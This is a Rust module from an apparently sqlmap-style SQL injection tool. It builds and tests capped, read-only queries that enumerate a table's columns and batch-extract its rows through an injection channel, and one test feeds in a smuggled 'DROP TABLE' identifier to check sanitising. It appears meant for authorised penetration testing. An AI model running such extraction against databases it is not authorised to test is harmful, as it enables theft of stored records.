//! Read-only schema → data walk (sqlmap's `--dump`, hard-capped).
//!
//! Bulk extraction is opt-in and dangerous to a program's rules of engagement,
//! so it is fenced on every side: **read-only `SELECT` only**, a row cap, and
//! the shared request budget. The walk enumerates a table's columns, then reads
//! rows in batches aggregated into a single string per request (a `group_concat`
//! / `string_agg` with separators we choose, so the scalar splits back apart
//! cleanly). Recovery itself flows through the same confirmed channel as every
//! other value — modelled here as a `FnMut(&str) -> Option<String>` so the walk
//! is fully testable without a live database.

use crate::detection::DbmsFamily;
use crate::dialects::{profile, ConcatStyle, DialectProfile};

/// Field/row separators wrapped into batched output so the scalar can be split
/// back into a grid. Chosen to be improbable in real column data.
const FIELD_SEP: &str = "|~f~|";
const ROW_SEP: &str = "|~r~|";

/// Hard limits on a dump walk. Every one of these is a fence: the walk stops at
/// whichever binds first.
#[derive(Debug, Clone, Copy)]
pub struct DumpLimits {
    /// Never recover more than this many rows.
    pub max_rows: usize,
    /// Never issue more than this many extraction requests.
    pub max_requests: usize,
    /// Rows fetched per request (batched via the aggregate).
    pub batch: usize,
}

impl Default for DumpLimits {
    fn default() -> Self {
        Self { max_rows: 20, max_requests: 64, batch: 20 }
    }
}

/// The outcome of a dump walk. `rows` is a grid; `note` is an honest account of
/// any bound that fired (unsupported engine, cap reached, nothing recovered).
#[derive(Debug, Clone, Default)]
pub struct DumpOutcome {
    pub table: String,
    pub columns: Vec<String>,
    pub rows: Vec<Vec<String>>,
    pub requests: usize,
    pub note: Option<String>,
}

/// The row-aggregate expression for this engine using a separator we control,
/// or `None` when we cannot build a paginated batch for it honestly.
fn row_aggregate(dbms: DbmsFamily, row_expr: &str) -> Option<String> {
    match dbms {
        DbmsFamily::MySQL | DbmsFamily::MariaDB => {
            Some(format!("group_concat({row_expr} SEPARATOR '{ROW_SEP}')"))
        }
        DbmsFamily::PostgreSQL => Some(format!("string_agg({row_expr},'{ROW_SEP}')")),
        DbmsFamily::SQLite => Some(format!("group_concat({row_expr},'{ROW_SEP}')")),
        _ => None,
    }
}

/// The column-name aggregate for `table`, or `None` when the engine has none.
fn column_agg(p: &DialectProfile, inner: &str) -> Option<String> {
    if !p.has_aggregate() {
        return None;
    }
    Some(p.aggregate.replace("%s", inner))
}

/// A read-only query listing the columns of `table`, or `None` when we cannot
/// build one honestly for this engine.
pub fn column_list_query(dbms: DbmsFamily, table: &str) -> Option<String> {
    let p = profile(dbms);
    let table = sanitize_ident(table);
    match dbms {
        DbmsFamily::SQLite => Some(format!(
            "(SELECT group_concat(name) FROM pragma_table_info('{table}'))"
        )),
        DbmsFamily::Oracle => {
            let agg = column_agg(&p, "column_name")?;
            Some(format!(
                "(SELECT {agg} FROM all_tab_columns WHERE table_name='{table}')"
            ))
        }
        _ => {
            let agg = column_agg(&p, "column_name")?;
            Some(format!(
                "(SELECT {agg} FROM information_schema.columns WHERE table_name='{table}')"
            ))
        }
    }
}

/// Whether we can build a bounded, paginated row batch for this engine.
pub fn supports_row_batch(dbms: DbmsFamily) -> bool {
    row_aggregate(dbms, "x").is_some()
}

/// A read-only query fetching a batch of rows from `table`: each row is a
/// [`FIELD_SEP`]-joined concat of `columns`, all rows aggregated into one scalar
/// separated by [`ROW_SEP`]. `None` when the engine has no paginated batch form.
pub fn row_batch_query(
    dbms: DbmsFamily,
    table: &str,
    columns: &[String],
    offset: usize,
    limit: usize,
) -> Option<String> {
    let p = profile(dbms);
    let table = sanitize_ident(table);
    let fsep = format!("'{FIELD_SEP}'");
    let cast_cols: Vec<String> = columns
        .iter()
        .map(|c| format!("COALESCE(CAST({} AS CHAR),'')", sanitize_ident(c)))
        .collect();
    let row_expr = join_concat(&p, &cast_cols, &fsep);
    let agg = row_aggregate(dbms, &row_expr)?;
    Some(format!(
        "(SELECT {agg} FROM (SELECT * FROM {table} LIMIT {limit} OFFSET {offset}) _b)"
    ))
}

/// Concatenate `parts` with `sep` between them, in the engine's concat style.
fn join_concat(p: &DialectProfile, parts: &[String], sep: &str) -> String {
    match p.concat {
        ConcatStyle::ConcatFn => {
            let mut args = Vec::new();
            for (i, part) in parts.iter().enumerate() {
                if i > 0 {
                    args.push(sep.to_string());
                }
                args.push(part.clone());
            }
            format!("CONCAT({})", args.join(","))
        }
        ConcatStyle::Pipes => parts.join(&format!("||{sep}||")),
        ConcatStyle::Plus => parts.join(&format!("+{sep}+")),
        ConcatStyle::None => parts.join(","),
    }
}

/// Split a recovered column-list scalar into names.
pub(crate) fn parse_columns(scalar: &str) -> Vec<String> {
    scalar
        .split(',')
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
        .collect()
}

/// Split a recovered row-batch scalar into a grid of `ncols`-wide rows.
pub(crate) fn parse_rows(scalar: &str, ncols: usize) -> Vec<Vec<String>> {
    if scalar.is_empty() {
        return Vec::new();
    }
    scalar
        .split(ROW_SEP)
        .map(|row| {
            let mut fields: Vec<String> = row.split(FIELD_SEP).map(|f| f.to_string()).collect();
            fields.resize(ncols.max(1), String::new());
            fields
        })
        .collect()
}

/// Walk `table` read-only, recovering columns then rows through `extract` (a
/// single scalar recovery through the confirmed channel), stopping at whichever
/// [`DumpLimits`] bound binds first. `extract` is called once per request.
pub fn dump_table<F>(dbms: DbmsFamily, table: &str, limits: DumpLimits, mut extract: F) -> DumpOutcome
where
    F: FnMut(&str) -> Option<String>,
{
    let mut out = DumpOutcome { table: table.to_string(), ..Default::default() };

    let Some(col_query) = column_list_query(dbms, table) else {
        out.note = Some(format!("dump not supported for {dbms:?}: no column catalogue expression"));
        return out;
    };
    if !supports_row_batch(dbms) {
        out.note = Some(format!("dump not supported for {dbms:?}: no paginated row aggregate"));
        return out;
    }

    out.requests += 1;
    let Some(col_scalar) = extract(&col_query) else {
        out.note = Some("column names not recovered on the confirmed channel".to_string());
        return out;
    };
    out.columns = parse_columns(&col_scalar);
    if out.columns.is_empty() {
        out.note = Some(format!("no columns found for table '{table}'"));
        return out;
    }

    let batch = limits.batch.max(1);
    let mut offset = 0usize;
    loop {
        if out.rows.len() >= limits.max_rows {
            out.note = Some(format!("row cap reached ({} rows)", limits.max_rows));
            break;
        }
        if out.requests >= limits.max_requests {
            out.note = Some(format!("request budget reached ({} requests)", limits.max_requests));
            break;
        }
        let remaining = limits.max_rows - out.rows.len();
        let limit = batch.min(remaining);
        let Some(query) = row_batch_query(dbms, table, &out.columns, offset, limit) else {
            break;
        };
        out.requests += 1;
        let Some(scalar) = extract(&query) else {
            break;
        };
        let rows = parse_rows(&scalar, out.columns.len());
        if rows.is_empty() {
            break;
        }
        let got = rows.len();
        for row in rows.into_iter().take(remaining) {
            out.rows.push(row);
        }
        offset += got;
        if got < limit {
            // Fewer rows than asked for means the table is exhausted.
            break;
        }
    }
    out
}

/// Strip anything but identifier/dotted/`$` chars from a caller-supplied name,
/// so a table/column argument cannot smuggle in SQL. The read-only gate on the
/// rendered query is still the authoritative check.
fn sanitize_ident(ident: &str) -> String {
    ident
        .chars()
        .filter(|c| c.is_ascii_alphanumeric() || *c == '_' || *c == '.' || *c == '$')
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::safety::{is_extraction_read_only, SafetyVerdict};

    #[test]
    fn column_and_row_queries_are_read_only() {
        let cols = column_list_query(DbmsFamily::MySQL, "users").unwrap();
        assert!(cols.contains("information_schema.columns"), "got {cols}");
        let batch = row_batch_query(
            DbmsFamily::MySQL,
            "users",
            &["id".to_string(), "email".to_string()],
            0,
            10,
        )
        .unwrap();
        assert!(batch.contains("LIMIT 10 OFFSET 0"), "got {batch}");
        assert!(batch.contains("group_concat"), "got {batch}");
        for q in [cols, batch] {
            assert!(matches!(is_extraction_read_only(&q), SafetyVerdict::Permitted), "{q}");
        }
    }

    #[test]
    fn sanitizes_injected_identifiers() {
        // A table name carrying SQL is stripped to bare identifier chars, so no
        // statement separator, comment, or quote can break out of the rendered
        // literal. The read-only gate on the rendered query is the authoritative
        // check; this asserts the injected control characters are gone and the
        // residue sits inertly inside the quoted identifier.
        let q = column_list_query(DbmsFamily::PostgreSQL, "users';DROP TABLE x--").unwrap();
        assert!(!q.contains(';'), "stacked statement leaked through: {q}");
        assert!(!q.contains("--"), "comment leaked through: {q}");
        assert!(
            q.contains("table_name='usersDROPTABLEx'"),
            "injected control chars not neutralized: {q}"
        );
        assert!(matches!(is_extraction_read_only(&q), SafetyVerdict::Permitted));
    }

    /// An in-memory table answering the exact queries the walk builds.
    fn mock_extract(cols: &'static [&'static str], data: Vec<Vec<&'static str>>) -> impl FnMut(&str) -> Option<String> {
        move |q: &str| {
            if q.contains("information_schema.columns") {
                return Some(cols.join(","));
            }
            // Parse LIMIT/OFFSET back out to page the in-memory table.
            let limit = grab_after(q, "LIMIT ");
            let offset = grab_after(q, "OFFSET ");
            let (limit, offset) = (limit?, offset?);
            let page: Vec<String> = data
                .iter()
                .skip(offset)
                .take(limit)
                .map(|row| row.join(FIELD_SEP))
                .collect();
            Some(page.join(ROW_SEP))
        }
    }

    fn grab_after(q: &str, key: &str) -> Option<usize> {
        let start = q.find(key)? + key.len();
        let rest = &q[start..];
        let end = rest.find(|c: char| !c.is_ascii_digit()).unwrap_or(rest.len());
        rest[..end].parse().ok()
    }

    #[test]
    fn walk_recovers_the_full_grid() {
        let data = vec![
            vec!["1", "alice@example.com"],
            vec!["2", "bob@example.com"],
            vec!["3", "carol@example.com"],
        ];
        let extract = mock_extract(&["id", "email"], data);
        let out = dump_table(
            DbmsFamily::MySQL,
            "users",
            DumpLimits { max_rows: 20, max_requests: 64, batch: 20 },
            extract,
        );
        assert_eq!(out.columns, vec!["id", "email"]);
        assert_eq!(out.rows.len(), 3);
        assert_eq!(out.rows[1], vec!["2", "bob@example.com"]);
        // 1 column request + 1 row request (all three rows in one batch).
        assert_eq!(out.requests, 2);
    }

    #[test]
    fn row_cap_stops_the_walk() {
        let data: Vec<Vec<&'static str>> = (0..100).map(|_| vec!["x", "y"]).collect();
        let extract = mock_extract(&["a", "b"], data);
        let out = dump_table(
            DbmsFamily::MySQL,
            "big",
            DumpLimits { max_rows: 5, max_requests: 64, batch: 2 },
            extract,
        );
        assert_eq!(out.rows.len(), 5, "row cap must bound the walk");
        assert!(out.note.as_deref().unwrap().contains("row cap"), "{:?}", out.note);
    }

    #[test]
    fn request_budget_stops_the_walk() {
        let data: Vec<Vec<&'static str>> = (0..100).map(|_| vec!["x"]).collect();
        let extract = mock_extract(&["a"], data);
        let out = dump_table(
            DbmsFamily::MySQL,
            "big",
            DumpLimits { max_rows: 100, max_requests: 3, batch: 1 },
            extract,
        );
        assert_eq!(out.requests, 3, "must not exceed the request budget");
        assert!(out.note.as_deref().unwrap().contains("budget"), "{:?}", out.note);
    }

    #[test]
    fn unsupported_engine_is_reported_not_faked() {
        // Sybase has no portable row aggregate in its profile.
        let out = dump_table(DbmsFamily::Sybase, "users", DumpLimits::default(), |_| {
            Some("should-not-be-called".to_string())
        });
        assert!(out.rows.is_empty());
        assert!(out.note.as_deref().unwrap().contains("not supported"), "{:?}", out.note);
    }
}
